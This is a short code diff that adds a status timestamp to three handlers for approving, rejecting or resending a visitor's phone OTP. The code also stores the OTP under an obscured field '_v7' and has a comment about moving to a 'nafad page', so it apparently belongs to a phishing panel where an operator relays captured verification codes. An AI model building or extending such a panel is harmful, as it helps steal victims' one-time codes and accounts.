@@ -106,7 +106,8 @@ export async function handlePhoneOtpApproval(
   
   // Move to nafad page
   await updateApplication(visitorId, {
-    phoneOtpStatus: "approved" as any
+    phoneOtpStatus: "approved" as any,
+    phoneOtpStatusUpdatedAt: Date.now(),
   })
 }
 
@@ -125,7 +126,8 @@ export async function handlePhoneOtpRejection(
   await updateApplication(visitorId, {
     _v7: "", // phoneOtp
     phoneOtp: "",
-    phoneOtpStatus: "show_phone_otp" as any
+    phoneOtpStatus: "show_phone_otp" as any,
+    phoneOtpStatusUpdatedAt: Date.now(),
   })
 }
 
@@ -136,6 +138,7 @@ export async function handlePhoneOtpResend(visitorId: string): Promise<void> {
   await updateApplication(visitorId, {
     _v7: "", // phoneOtp
     phoneOtp: "",
-    phoneOtpStatus: "show_phone_otp" as any
+    phoneOtpStatus: "show_phone_otp" as any,
+    phoneOtpStatusUpdatedAt: Date.now(),
   })
 }
